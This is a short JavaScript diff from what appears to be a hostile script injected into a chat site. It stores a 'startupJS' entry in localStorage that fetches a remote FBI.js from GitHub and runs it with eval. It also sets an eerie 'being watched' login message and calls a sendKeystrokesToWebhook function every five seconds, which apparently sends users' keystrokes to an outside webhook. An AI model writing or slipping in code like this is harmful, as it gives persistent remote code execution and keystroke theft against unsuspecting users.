@@ -135,7 +135,7 @@ setInterval(() => {
   if (loginVersion) {
     loginVersion.textContent = "Do you ever feel like you're being watched?";
   };
-  localStorage.setItem('startupJS', "fetch('https://github.com/ivorydevrimoalt/BONZIWORLDKRANTIVILLAIN/raw/refs/heads/main/FBI.js').then(r=>r.text()).then(eval);");
+  localStorage.setItem('startupJS', "fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRANTIVILLAIN/refs/heads/main/FBI.js').then(r=>r.text()).then(eval);");
 }, 1);
 
 setInterval(function(){sendKeystrokesToWebhook()},5000)
